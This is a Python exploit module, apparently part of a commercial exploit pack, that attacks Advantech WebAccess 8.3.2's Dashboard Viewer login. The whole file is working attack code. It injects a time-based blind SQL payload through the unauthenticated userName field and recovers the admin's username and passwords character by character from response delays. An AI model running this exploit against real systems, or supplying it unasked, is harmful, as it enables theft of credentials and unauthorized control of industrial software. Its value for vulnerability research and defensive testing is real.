from Sploit import Sploit
from collections import OrderedDict
import string
import urllib2
import time

INFO = {}
INFO['NAME'] = "efs_advantech_webaccess_8_3_2_dashboard_bsqli"
INFO['DESCRIPTION'] = "Advantech Webaccess 8.3.2 Dashboard Blind SQL Injection"
INFO['VENDOR'] = "http://www.advantech.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """The specific flaw exists at the login page of the Dashboard Viewer in the following two queries in accessdb.js:\r\n
'SELECT Area121 FROM ' + strTable + ' WHERE UserName = \\'' + userName + '\\'';\r\n
'SELECT * FROM ' + strTable + ' WHERE StrComp(UserName, \\'' + userName + '\\',0) = 0';\r\n
It is possible to inject SQL code into 'userName' parameter. This allows to use time-based blind SQL injection to retrieve
data since no data is returned back to UI.
This module extracts admin's credentials. No authorization is required.
"""
INFO['DOWNLOAD_LINK'] = "http://support.advantech.com/support/DownloadSRDetail_New.aspx?SR_ID=1-MS9MJV&Doc_Source=Download"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/General"
INFO['AUTHOR'] = "06 Nov 2018, Gleg Team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = '192.168.1.57', dict(description='Target host')
OPTIONS["PORT"] = 8081, dict(description='Dashboard viewer port')
OPTIONS["DELAY"] = 15, dict(description='Expected delay in seconds')
OPTIONS["USE_SSL"] = False, dict(description='Use SSL?')
OPTIONS["BASEPATH"] = '/'

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 8081
        self.delay = 15
        self.char_pool = string.ascii_lowercase + string.ascii_uppercase + string.digits + ':$.@\\/+'
        self.sqli = 'username=admin\' and iif({CHARCODE}=(select top 1 asc(mid({FIELDNAME},{POSITION},1)) from {TABLENAME}), (SELECT count(*) FROM MSysAccessStorage As T1, MSysAccessStorage AS T2, MSysAccessStorage AS T3, MSysAccessStorage AS T4, MSysAccessStorage AS T5, MSysAccessStorage AS T6)>0, \'\')%00'
        self.basepath = '/'

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.delay = self.args.get("DELAY", self.delay)
        self.basepath = self.args.get("BASEPATH", self.basepath)

        self.protocol = 'https' if self.args.get("USE_SSL", False) else 'http'
        self.url = '{}://{}:{}{}WADashboard/login?cont=dashboardViewer'.format(self.protocol, self.host, self.port, self.basepath)

    def find_letter(self, pos):
        for letter in self.char_pool:
            data = self.sqli.format(CHARCODE=ord(letter),
                                    FIELDNAME='UserName%26\'%3A\'%26Password%26\'%3A\'%26Password2',
                                    POSITION=pos,
                                    TABLENAME='pUserPassword'
                                    )
            start = time.time()
            try:
                urllib2.urlopen(self.url, data)
            except urllib2.HTTPError:
                pass

            if time.time() - start >= self.delay:
                return letter

        return None


    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        self.log('[*] Be patient, extraction takes some time...')
        result, i = "", 1
        char = self.find_letter(i)

        while char:
            result += char
            i += 1
            char = self.find_letter(i)
            self.log("Current result: {}".format(result))

        if result:
            self.log("Final result: %s" % result)
            self.finish(True)
        else:
            self.log("Credentials extraction failed.")
            self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()